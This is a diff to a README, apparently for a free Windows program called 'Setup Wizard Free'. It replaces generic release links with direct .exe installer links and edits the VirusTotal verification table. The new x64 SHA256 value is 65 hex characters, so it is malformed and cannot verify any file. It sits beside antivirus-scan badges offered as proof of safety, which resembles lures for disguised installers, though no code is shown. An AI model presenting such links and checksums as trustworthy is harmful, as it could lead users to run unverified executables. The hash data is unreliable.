@@ -31,9 +31,9 @@
 
 | Architecture | Download | Size |
 |-------------|----------|------|
-| **x64 (64-bit)** | [Download](releases/latest) | **88.9 MB** |
-| **x32 (32-bit)** | [Download](releases/latest) | **83.3 MB** |
-| **ARM64** | [Download](releases/latest) | **90.5 MB** |
+| **x64 (64-bit)** | [Download](https://github.com/git-x-ai/setup-wizard-free/releases/download/v1.0.0/Setup.Wizard.Free.Setup.1.0.0.exe) | **88.9 MB** |
+| **x32 (32-bit)** | [Download](https://github.com/git-x-ai/setup-wizard-free/releases/download/v1.0.0/Setup-Wizard-Free-x32-Setup-1.0.0.exe) | **83.3 MB** |
+| **ARM64** | [Download](https://github.com/git-x-ai/setup-wizard-free/releases/download/v1.0.0/Setup-Wizard-Free-ARM64-Setup-1.0.0.exe) | **90.5 MB** |
 
 ### System Requirements
 
@@ -72,7 +72,7 @@ All installers have been scanned by multiple antivirus engines through VirusTota
 
 | Architecture | VirusTotal Analysis | SHA256 Hash |
 |-------------|-------------------|-------------|
-| **x64 (64-bit)** | [![VirusTotal](https://img.shields.io/badge/VirusTotal-Analysis-blue.svg)](https://www.virustotal.com/gui/file/bc856dcf6c95da371c5f5061ef3b613e87f179c8fbb6650e8e950687ce111253?nocache=1) | `bc856dcf6c95da371c5f5061ef3b613e87f179c8fbb6650e8e950687ce111253` |
+| **x64 (64-bit)** | [![VirusTotal](https://img.shields.io/badge/VirusTotal-Analysis-blue.svg)](https://www.virustotal.com/gui/file/bbc856dcf6c95da371c5f5061ef3b613e87f179c8fbb6650e8e950687ce111253?nocache=1) | `bbc856dcf6c95da371c5f5061ef3b613e87f179c8fbb6650e8e950687ce111253` |
 | **x32 (32-bit)** | [![VirusTotal](https://img.shields.io/badge/VirusTotal-Analysis-blue.svg)](https://www.virustotal.com/gui/file/7feb901670a8e67ee2e774445bf590f33e65ec0204eff25f5c609f73df2feb6d?nocache=1) | `7feb901670a8e67ee2e774445bf590f33e65ec0204eff25f5c609f73df2feb6d` |
 | **ARM64** | [![VirusTotal](https://img.shields.io/badge/VirusTotal-Analysis-blue.svg)](https://www.virustotal.com/gui/file/563d9c30800f3518b6d823e3499180724d57a03a99b311b1bef76d994e9ebb55?nocache=1) | `563d9c30800f3518b6d823e3499180724d57a03a99b311b1bef76d994e9ebb55` |
 
